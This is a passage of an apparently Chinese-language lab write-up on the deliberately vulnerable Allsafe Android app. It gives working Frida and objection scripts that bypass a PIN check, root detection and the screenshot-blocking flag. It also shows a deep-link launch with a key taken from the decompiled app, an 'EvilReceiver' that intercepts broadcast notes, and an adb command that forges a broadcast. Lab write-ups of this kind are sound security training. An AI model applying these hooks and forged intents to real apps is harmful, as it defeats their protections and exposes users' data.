+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757847020690-bebb42f6-4e6f-4e22-b84d-7235960975b5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过解码 base64 的内容可以指导这个 pin 值应该输入<code>4863</code>；</p>
+<p>除此之外，还可以通过 frida hook<code>checkPin</code>函数实现任意 pin 值 bypass</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java">adb shell<br>su<br>cd /data/local/tmp<br>./frida-server-<span class="hljs-number">16.7</span><span class="hljs-number">.19</span>-android-x86_64<br>adb forward tcp:<span class="hljs-number">27042</span> tcp:<span class="hljs-number">27042</span><br>adb forward tcp:<span class="hljs-number">27043</span> tcp:<span class="hljs-number">27043</span><br><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><br>def <span class="hljs-title function_">on_message</span><span class="hljs-params">(message, data)</span>:<br>    <span class="hljs-keyword">if</span> message.get(<span class="hljs-string">&quot;type&quot;</span>) == <span class="hljs-string">&quot;send&quot;</span>:<br>        print(<span class="hljs-string">&quot;[JS]&quot;</span>, message.get(<span class="hljs-string">&quot;payload&quot;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;[ERR]&quot;</span>, json.dumps(message))<br><br>rdev = frida.get_remote_device()<br>session = rdev.attach(<span class="hljs-string">&quot;allsafe&quot;</span>)   # 替换为目标应用包名<br><br>js_template = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">setImmediate(function() &#123;</span><br><span class="hljs-string">    Java.perform(function() &#123;</span><br><span class="hljs-string">        var PinBypass = Java.use(&quot;infosecadventures.allsafe.challenges.PinBypass&quot;); // 替换为目标类名</span><br><span class="hljs-string">        PinBypass.checkPin.overload(&quot;java.lang.String&quot;).implementation = function(arg) &#123; </span><br><span class="hljs-string">            send(&quot;checkPin called with arg: &quot; + arg);</span><br><span class="hljs-string">            var result = this.checkPin(arg);</span><br><span class="hljs-string">            result = true; // 强制返回true</span><br><span class="hljs-string">            send(&quot;checkPin returning: &quot; + result);</span><br><span class="hljs-string">            return result;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>script = session.create_script(js_template)<br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br>print(<span class="hljs-string">&quot;[*] script loaded. Press Enter to detach and exit.&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    sys.stdin.read()<br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-keyword">try</span>:<br>        session.detach()<br>    except Exception:<br>        pass<br>    <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-string">&quot;[*] detached.&quot;</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757860031205-6f411c70-7a25-4980-a475-f333fc1abfa9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1757860059305-8836abdf-a660-495e-aba5-d3cc7b8687b0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="6-2-漏洞总结"><a href="#6-2-漏洞总结" class="headerlink" title="6.2 漏洞总结"></a>6.2 漏洞总结</h2><p>这种漏洞的场景有点类似于注册码，能够通过 hook 等方式进行绕过。<br>还有就是手机号是否为内部用户认证的场景，只有内部用户才能够发送收集验证码进行登录，可以通过 hook 相关的验证函数进行绕过登录系统；</p>
+<h1 id="7-Root-Detection-Root-权限检测"><a href="#7-Root-Detection-Root-权限检测" class="headerlink" title="7 Root Detection(Root 权限检测)"></a>7 Root Detection(Root 权限检测)</h1><h2 id="7-1-漏洞复现"><a href="#7-1-漏洞复现" class="headerlink" title="7.1 漏洞复现"></a>7.1 漏洞复现</h2><p>通过定位题目实现代码位置可以发现貌似也可以使用 frida hook <code>isRooted</code>函数实现 Root 权限检测绕过；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546267445-1460b1fe-222b-4e08-9cd5-2a9f8019a652.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546325277-3a023c5e-b189-432a-9fc3-ea2465b59a1c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接尝试使用 frida hook 该函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><br>def <span class="hljs-title function_">on_message</span>(message, data):<br>    <span class="hljs-keyword">if</span> message.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;type&quot;</span>) == <span class="hljs-string">&quot;send&quot;</span>:<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[JS]&quot;</span>, message.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;payload&quot;</span>))<br>    <span class="hljs-attr">else</span>:<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[ERR]&quot;</span>, json.<span class="hljs-title function_">dumps</span>(message))<br><br>rdev = frida.<span class="hljs-title function_">get_remote_device</span>()<br>session = rdev.<span class="hljs-title function_">attach</span>(<span class="hljs-string">&quot;allsafe&quot;</span>)   # 替换为目标应用包名<br><br>js_template = <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">setImmediate(function() &#123;</span><br><span class="hljs-string">    Java.perform(function() &#123;</span><br><span class="hljs-string">        var RootBeer = Java.use(&quot;</span>com.<span class="hljs-property">scottyab</span>.<span class="hljs-property">rootbeer</span>.<span class="hljs-property">RootBeer</span><span class="hljs-string">&quot;); // 替换为目标类名</span><br><span class="hljs-string">        RootBeer.isRooted.overload().implementation = function() &#123; </span><br><span class="hljs-string">            var result = this.isRooted();</span><br><span class="hljs-string">            result = false; // 强制返回false</span><br><span class="hljs-string">            send(&quot;</span>isRooted <span class="hljs-attr">returning</span>: <span class="hljs-string">&quot; + result);</span><br><span class="hljs-string">            return result;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br>script = session.<span class="hljs-title function_">create_script</span>(js_template)<br>script.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.<span class="hljs-title function_">load</span>()<br><span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] script loaded. Press Enter to detach and exit.&quot;</span>)<br><span class="hljs-attr">try</span>:<br>    sys.<span class="hljs-property">stdin</span>.<span class="hljs-title function_">read</span>()<br><span class="hljs-attr">finally</span>:<br>    <span class="hljs-attr">try</span>:<br>        session.<span class="hljs-title function_">detach</span>()<br>    except <span class="hljs-title class_">Exception</span>:<br>        pass<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] detached.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546683216-ec611c37-5a60-4174-8f4f-c9e81467c66c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>除了上述的方法，还可以使用 objection 实现 bypass，其功能与 frida 基本类似。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">objection -g infosecadventures.<span class="hljs-property">allsafe</span> explore --startup-command <span class="hljs-string">&quot;android hooking set return_value com.scottyab.rootbeer.RootBeer.isRooted false&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758546940083-bb539cac-7987-4907-85fc-0806bffcf9ab.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="7-2-漏洞总结"><a href="#7-2-漏洞总结" class="headerlink" title="7.2 漏洞总结"></a>7.2 漏洞总结</h2><p>对于此类由于函数执行导致的过滤或者其他内容，一般可以采用 frida hook 相关函数进行 bypass。</p>
+<p>该场景的内容与 pin bypass 基本一致。</p>
+<h1 id="8-Secure-Flag-Bypass-安全标志绕过"><a href="#8-Secure-Flag-Bypass-安全标志绕过" class="headerlink" title="8 Secure Flag Bypass(安全标志绕过)"></a>8 Secure Flag Bypass(安全标志绕过)</h1><h2 id="8-1-漏洞复现"><a href="#8-1-漏洞复现" class="headerlink" title="8.1 漏洞复现"></a>8.1 漏洞复现</h2><p>题目说明这是一个对 frida 的练习，并不涉及漏洞。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758547742839-91634496-cc08-4ed5-be93-7b63d6dd73b9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>主要是想说明当前所处界面无法截图，希望我们通过 frida hook 相关内容实现在当前页面能够截图；</p>
+<p>定位到 MainActivity 代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758548244621-66da5145-cebc-4509-bf8a-bc83eed7a672.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在该处阻止截图&#x2F;录屏&#x2F;在最近任务中生成预览，具体内容参考<a target="_blank" rel="noopener" href="https://developer.android.com/security/fraud-prevention/activities?hl=zh-cn#java%EF%BC%8C%E5%B9%B6%E7%BB%93%E5%90%88">https://developer.android.com/security/fraud-prevention/activities?hl=zh-cn#java，并结合</a> ai 解析可知通过<code>getWindow().setFlags(0,8192)</code>即可允许截图；</p>
+<p><code>getWindows()</code>获取到的<code>Window</code>是<code>android.view.Window</code>类型，因此对该类的<code>setFlags()</code>函数进行 hook 实现允许截图；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758549659528-cf7571fa-b5e1-4537-83a8-893ed6e112e8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> json<br><br># ====== 配置======<br>PACKAGE = <span class="hljs-string">&quot;infosecadventures.allsafe&quot;</span><br># =================================<br><br>def <span class="hljs-title function_">on_message</span><span class="hljs-params">(message, data)</span>:<br>    <span class="hljs-keyword">if</span> message.get(<span class="hljs-string">&quot;type&quot;</span>) == <span class="hljs-string">&quot;send&quot;</span>:<br>        print(<span class="hljs-string">&quot;[JS]&quot;</span>, message.get(<span class="hljs-string">&quot;payload&quot;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;[ERR]&quot;</span>, json.dumps(message))<br><br># 选择设备（USB 优先）<br>device = None<br><span class="hljs-keyword">try</span>:<br>    device = frida.get_usb_device(timeout=<span class="hljs-number">5</span>)<br>except Exception:<br>    device = frida.get_remote_device()<br><br>pid = device.spawn([PACKAGE])<br>session = device.attach(pid)<br><br># JS 模板：hook 单个方法的所有 overloads（或按 SPECIFIC_SIG 精确匹配）<br>js_template = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">setImmediate(function() &#123;</span><br><span class="hljs-string">    Java.perform(function() &#123;</span><br><span class="hljs-string">        var Window = Java.use(&quot;android.view.Window&quot;); // 替换为目标类名</span><br><span class="hljs-string">        Window.setFlags.overload(&#x27;int&#x27;,&#x27;int&#x27;).implementation = function(flags, mask) &#123; </span><br><span class="hljs-string">            send(&quot;setFlags called with flags: &quot; + flags + &quot;, mask: &quot; + mask);</span><br><span class="hljs-string">            flags = flags &amp; (~0x2000)</span><br><span class="hljs-string">            var result = this.setFlags(flags, mask);</span><br><span class="hljs-string">            send(&quot;setFlags modified flags to: &quot; + flags);</span><br><span class="hljs-string">            return result;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>script = session.create_script(js_template)<br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br>script.load()<br><br>device.resume(pid)<br><br>print(<span class="hljs-string">&quot;[*] script loaded. Press Enter to detach and exit.&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    sys.stdin.read()<br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-keyword">try</span>:<br>        session.detach()<br>    except Exception:<br>        pass<br>    <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-string">&quot;[*] detached.&quot;</span>)</span><br></code></pre></td></tr></table></figure>
+
+<p>由于这个 Flags 的设置是在程序启动阶段进行的设置，因此这里的 hook 需要采用<code>spawn</code>方式进行 hook，实现对初始化逻辑的 hook 劫持，允许屏幕截图；</p>
+<h2 id="8-2-漏洞总结"><a href="#8-2-漏洞总结" class="headerlink" title="8.2 漏洞总结"></a>8.2 漏洞总结</h2><p>该场景是一个典型的必须使用 spawn 劫持类型的场景。因为阻止截图&#x2F;录屏&#x2F;在最近任务中生成预览是程序初始化的时候就进行了设置，因此需要通过 spawn 方式劫持初始化阶段的设置；</p>
+<h1 id="9-Deep-Link-Exploitation-深链接利用"><a href="#9-Deep-Link-Exploitation-深链接利用" class="headerlink" title="9 Deep Link Exploitation(深链接利用)"></a>9 Deep Link Exploitation(深链接利用)</h1><h2 id="9-1-漏洞复现"><a href="#9-1-漏洞复现" class="headerlink" title="9.1 漏洞复现"></a>9.1 漏洞复现</h2><p><strong>Deep Link（深度链接)</strong> 是指一种 URL（通常是自定义协议或特定路径的 HTTP&#x2F;HTTPS 链接），点击后可以直接唤起手机上的某个 App，并跳转到指定的内部页面或执行特定操作;</p>
+<p>比如：</p>
+<ul>
+<li>普通链接：<code>https://shopping.com</code> → 打开浏览器访问网站首页</li>
+<li>深度链接：<code>shopping://product/12345</code> → 打开购物 App 并直接跳转到商品 ID 为 12345 的页面</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758636812329-ad9a2e5e-bb8d-46ff-bc0a-68b003f6ffee.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">getString(C1679R.<span class="hljs-built_in">string</span>.<span class="hljs-built_in">key</span>)`指的是返回应用资源文件（res/<span class="hljs-built_in">values</span>/strings.xml）中 R.<span class="hljs-built_in">string</span>.<span class="hljs-built_in">key</span> 对应的文本内容；对应内容位于`res/<span class="hljs-built_in">values</span>/strings.xml<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758636753329-5a9c439a-6ca1-4365-89a1-1352761363a9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span>&gt;</span>ebfb7ff0-b2f6-41c8-bef3-4fba17be410c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758637444312-46606fdd-4a73-42cd-9195-caebf61ac51f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过查看代码发现<code>infosecadventures.allsafe.challenges.DeepLinkTask</code>可以被外部唤起；</p>
+<p>且相对应的模式、host 以及路径分别为<code>allsafe</code>、<code>infosecadventures</code>、<code>congrats</code></p>
+<p>或者通过 https 进行启动；</p>
+<p>结合前面题目相应的代码，获取请求 uri 中的<code>key</code>参数，判断其内容是否为字符串<code>ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</code></p>
+<p>因此得出最后的启动方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell am start -a android.intent.action.VIEW -d <span class="hljs-string">&quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758637844357-b992290b-6f32-43be-8a2e-3d746dd8fda0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="9-2-漏洞总结"><a href="#9-2-漏洞总结" class="headerlink" title="9.2 漏洞总结"></a>9.2 漏洞总结</h2><p>对于此类漏洞的检查可以通过查看<code>AndroidManifest.xml</code>，Activity 是否有<code>&lt;intent-filter&gt;</code>（通常会包含 <code>&lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;</code> 和 <code>&lt;data android:scheme=&quot;...&quot; .../&gt;</code>如果有，通常是可被外部唤起的。然后尝试用 <code>adb</code> 发起 VIEW Intent（替换 scheme&#x2F;host&#x2F;path）；</p>
+<p>判断漏洞存在的关键条件：</p>
+<ol>
+<li>Activity 对外暴露：manifest 包含 intent-filter 或 android:exported&#x3D;”true”。</li>
+<li>能通过 URL 传入 key 参数（例如 ?key&#x3D;…）并被直接使用。</li>
+<li>没有登录&#x2F;会话等额外验证 —— 只凭该参数就完成敏感操作。</li>
+<li>资源中的 key 可被反编译&#x2F;读取，或 key 为静态可猜测值。</li>
+</ol>
+<h1 id="10-Insecure-Broadcast-Receiver-不安全的广播接收器"><a href="#10-Insecure-Broadcast-Receiver-不安全的广播接收器" class="headerlink" title="10 Insecure Broadcast Receiver(不安全的广播接收器)"></a>10 Insecure Broadcast Receiver(不安全的广播接收器)</h1><h2 id="10-1-漏洞复现"><a href="#10-1-漏洞复现" class="headerlink" title="10.1 漏洞复现"></a>10.1 漏洞复现</h2><p>BroadcastReceiver 用于接收 Intent 广播（系统或应用发出的消息）。它可以在 manifest 中声明（静态注册），也可以在代码里动态注册（registerReceiver）。如果未正确配置或校验输入，广播是个很容易被滥用的攻击面，因为任意应用可以发送 Intent 与之交互（除非有权限或显式目标）。</p>
+<p>定位到该题目的相关代码中</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">/* loaded from: classes4.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InsecureBroadcastReceiver</span> <span class="hljs-title">extends</span> <span class="hljs-title">Fragment</span> &#123;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.Fragment</span><br>    <span class="hljs-keyword">public</span> View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123;<br>        View view = inflater.inflate(C1679R.layout.fragment_insecure_broadcast_receiver, container, <span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">final</span> TextInputEditText note = (TextInputEditText) view.findViewById(C1679R.id.note);<br>        Button save = (Button) view.findViewById(C1679R.id.save);<br>        save.setOnClickListener(new View.OnClickListener() &#123; <span class="hljs-comment">// from class: infosecadventures.allsafe.challenges.InsecureBroadcastReceiver$$ExternalSyntheticLambda0</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> void onClick(View view2) &#123;<br>                <span class="hljs-keyword">this</span>.f$<span class="hljs-number">0.</span>lambda$onCreateView$<span class="hljs-number">0</span>(note, view2);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> view;<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-comment">/* synthetic */</span> void lambda$onCreateView$<span class="hljs-number">0</span>(TextInputEditText note, View v) &#123;<br>        <span class="hljs-keyword">if</span> (!note.getText().toString().isEmpty()) &#123;<br>            Intent intent = new Intent();<br>            intent.setAction(<span class="hljs-string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span>);<br>            intent.putExtra(<span class="hljs-string">&quot;server&quot;</span>, <span class="hljs-string">&quot;prod.allsafe.infosecadventures.io&quot;</span>);<br>            intent.putExtra(<span class="hljs-string">&quot;note&quot;</span>, note.getText().toString());<br>            intent.putExtra(<span class="hljs-string">&quot;notification_message&quot;</span>, <span class="hljs-string">&quot;Allsafe is processing your note...&quot;</span>);<br>            PackageManager packageManager = requireActivity().getPackageManager();<br>            List&lt;ResolveInfo&gt; resolveInfos = packageManager.queryBroadcastReceivers(intent, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">for</span> (ResolveInfo info : resolveInfos) &#123;<br>                ComponentName cn = new ComponentName(info.activityInfo.packageName, info.activityInfo.name);<br>                intent.setComponent(cn);<br>                requireActivity().sendBroadcast(intent);<br>            &#125;<br>            SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;Saving note...&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;The note field can&#x27;t be empty!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>代码先用 <code>queryBroadcastReceivers(intent, 0)</code> 列出所有能够处理 <code>infosecadventures.allsafe.action.PROCESS_NOTE</code> 的 <code>receiver</code>，然后对每个 ResolveInfo 调用 <code>intent.setComponent(cn)</code> 并 <code>sendBroadcast(intent)</code>。也就是说：任何安装了注册相同 action 的第三方 app 都会收到包含 note、server 等 extras 的 Intent。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.receiver4allsafe;<br><br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-keyword">if</span> (Objects.equals(intent.getAction(), <span class="hljs-string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span>))&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;server&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">note</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;note&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;notification_message&quot;</span>);<br><br>            Log.i(<span class="hljs-string">&quot;EvilReceiver&quot;</span>, <span class="hljs-string">&quot;Received: server=&quot;</span> + server + <span class="hljs-string">&quot;, note=&quot;</span> + note + <span class="hljs-string">&quot;, msg=&quot;</span> + msg);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758785889527-3df75771-ea0a-4219-8af8-28be7c85e154.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>除了上述通过自己写的广播接收器接收来自 allsafe 的通知以外，我们还可以通过构建显示广播实现伪造通知</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">adb shell am broadcast -n infosecadventures.allsafe/.challenges.NoteReceiver --es server <span class="hljs-string">&quot;prod.allsafe.infosecadventures.io&quot;</span> --es note <span class="hljs-string">&quot;POC&quot;</span> --es notification_message <span class="hljs-string">&quot;hello everyone&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758786899957-7e384f34-c172-4c42-a6fd-607cf04b676b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="10-2-漏洞总结"><a href="#10-2-漏洞总结" class="headerlink" title="10.2 漏洞总结"></a>10.2 漏洞总结</h2><p>广播通知目前看到的两个类型的漏洞，一个是通过自定义的广播接收器接收来自软件泄露的通知信息导致的信息泄露；另一个是伪造通知信息，导致 dos 攻击等；</p>
